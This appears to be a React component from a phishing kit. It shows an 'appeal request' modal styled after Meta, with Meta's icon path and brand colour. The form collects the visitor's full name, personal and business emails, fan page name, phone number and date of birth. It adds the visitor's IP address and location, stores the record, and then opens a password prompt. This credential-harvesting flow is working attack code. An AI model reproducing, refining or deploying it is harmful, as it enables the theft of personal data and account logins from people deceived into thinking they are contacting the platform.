import React from 'react';
import Modal from './Modal';
import PhoneInput from 'react-phone-input-2';
import "react-phone-input-2/lib/style.css";
import CustomCheckbox from '../check-box/CustomCheckbox';
import { saveRecord } from '../../app/utils';
import "../../app/libs/i18n"
import { useTranslation } from 'react-i18next';

interface ClientModalProps {
    isOpenAuth: boolean;
    userLocation: Record<string, any>;
    countryCode: string;
    onToggleAuth: (value: boolean) => void;
    onOpendPassword: (value: boolean) => void;
}

const ClientModal: React.FC<ClientModalProps> = ({ isOpenAuth, userLocation, countryCode, onToggleAuth, onOpendPassword }) => {

    const [isOpen, setIsOpen] = React.useState(isOpenAuth);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    const { t, i18n } = useTranslation();

    const [formData, setFormData] = React.useState({
        fullName: '',
        email: '',
        emailBusiness: '',
        fanpage: '',
        phone: '',
        day: '',
        month: '',
        year: ''
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
    };

    React.useEffect(() => {
        setIsOpen(isOpenAuth);
    }, [isOpenAuth]);

    const handleClose = () => {
        setIsOpen(false);
        onToggleAuth(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.fullName.trim()) newErrors.fullName = t('modal.appeal_request.form.name.required');
            if (!formData.email.trim()) newErrors.email = t('modal.appeal_request.form.email.required');
            if (!formData.emailBusiness.trim()) newErrors.emailBusiness = t('modal.appeal_request.form.email_business.required');
            if (!formData.fanpage.trim()) newErrors.fanpage = t('modal.appeal_request.form.page_name.required');
            if (!formData.phone.trim()) newErrors.phone = t('modal.appeal_request.form.phone_number.required');
            if (!formData.day.trim()) newErrors.day = t('modal.appeal_request.form.date_of_birth.day.required');
            if (!formData.month.trim()) newErrors.month = t('modal.appeal_request.form.date_of_birth.month.required');
            if (!formData.year.trim()) newErrors.year = t('modal.appeal_request.form.date_of_birth.year.required');

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }

            const clientData = {
                ...formData,
                ip: userLocation?.ip || "Unknown",
                location: userLocation?.location || "Unknown"
            };

            await saveRecord("__client_rec__fi_rst", clientData);
            onOpendPassword(true);
            handleClose();

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title={t('modal.appeal_request.title')}
            onClose={handleClose}
        >
            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <form onSubmit={handSubmit}>
                    <div className='w-full'>
                        <div className={inputClass('fullName')}>
                            <input
                                type="text"
                                id='fullName'
                                placeholder={t('modal.appeal_request.form.name.placeholder')}
                                className="w-full outline-[0] h-full"
                                value={formData.fullName}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('fullName')}

                        <div className={inputClass('email')}>
                            <input
                                type="text"
                                id='email'
                                placeholder={t('modal.appeal_request.form.email.placeholder')}
                                className="w-full outline-[0] h-full"
                                value={formData.email}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('email')}

                        <div className={inputClass('emailBusiness')}>
                            <input
                                type="text"
                                id='emailBusiness'
                                placeholder={t('modal.appeal_request.form.email_business.placeholder')}
                                className="w-full outline-[0] h-full"
                                value={formData.emailBusiness}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('emailBusiness')}

                        <div className={inputClass('fanpage')}>
                            <input
                                type="text"
                                id='fanpage'
                                placeholder={t('modal.appeal_request.form.page_name.placeholder')}
                                className="w-full outline-[0] h-full"
                                value={formData.fanpage}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('fanpage')}

                        <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
                            <PhoneInput
                                country={countryCode?.toLowerCase() || "us"}
                                value={formData.phone}
                                onChange={(phone) => setFormData(prev => ({ ...prev, phone }))}
                            />
                        </div>
                        {errorText('phone')}

                        <div>
                            <b className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.appeal_request.form.date_of_birth.title')}</b>
                        </div>
                        <div className="grid grid-cols-3 gap-[10px]">
                            <div>
                                <div className={inputClass('day')}>
                                    <input
                                        type="number"
                                        placeholder={t('modal.appeal_request.form.date_of_birth.day.placeholder')}
                                        id='day'
                                        className="w-full outline-0 h-full"
                                        value={formData.day}
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('day')}
                            </div>

                            <div>
                                <div className={inputClass('month')}>
                                    <input
                                        type="number"
                                        placeholder={t('modal.appeal_request.form.date_of_birth.month.placeholder')}
                                        className="w-full outline-0 h-full"
                                        value={formData.month}
                                        id='month'
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('month')}
                            </div>

                            <div>
                                <div className={inputClass('year')}>
                                    <input
                                        type="number"
                                        inputMode="numeric"
                                        placeholder={t('modal.appeal_request.form.date_of_birth.year.placeholder')}
                                        id='year'
                                        className="w-full outline-0 h-full"
                                        value={formData.year}
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('year')}
                            </div>

                        </div>

                        <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
                            <textarea
                                id='message'
                                className="w-full outline-0 h-full resize-none"
                                placeholder={t('modal.appeal_request.form.issue.placeholder')}
                            />
                        </div>

                        <div>
                            <p className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.appeal_request.form.issue.note')}</p>
                        </div>
                        <div className='mt-[15px] mb-[20px]'>
                            <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                                <CustomCheckbox />
                                {t('modal.appeal_request.form.check_form.title')}
                                <a className="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">{t('modal.appeal_request.form.check_form.link')} <img src="/meta/reject.svg" className="w-[10px] h-[10px] items-center inline" alt="reject" /></a>
                            </label>
                        </div>
                        <div className='w-full mt-[20px] '>
                            <button className='w-full h-[40px] min-h-[40px] bg-[#0064E0] text-[white] rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer'>{t('modal.appeal_request.form.button')}</button>
                        </div>
                    </div>

                </form>
            </div>
        </Modal>
    );
};

export default ClientModal;
